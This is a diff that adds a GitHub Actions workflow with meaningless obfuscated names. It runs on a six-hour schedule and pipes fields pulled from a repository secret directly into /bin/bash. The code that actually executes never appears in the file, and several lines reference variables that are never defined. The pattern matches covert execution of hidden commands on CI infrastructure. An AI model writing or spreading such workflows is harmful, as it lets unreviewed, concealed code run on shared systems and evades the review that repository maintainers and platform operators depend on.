@@ -1,0 +1,25 @@
+name: songzaozhongzhang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: songzaozhongzhang
+        env:
+          iuv8: ${{ secrets.iuv8 }}
+        run: |
+          echo $iuv8 | jq -r .ku886 | /bin/bash
+          echo $gi22 | jq -r .amxys2290 | /bin/bash
+          echo $dwu77 | jq -r .xcfmo71 | /bin/bash
+          echo $ruqq8 | jq -r .fi2496 | /bin/bash
+          echo $xcj223 | jq -r .ik8643 | /bin/bash
+          echo $ebv02 | jq -r .bb32 | /bin/bash
+          echo $s7 | jq -r .yrtyv45115 | /bin/bash
+          echo $g65116 | jq -r .rifdt37 | /bin/bash
+          echo $ylv3 | jq -r .ezazc35566 | /bin/bash
+
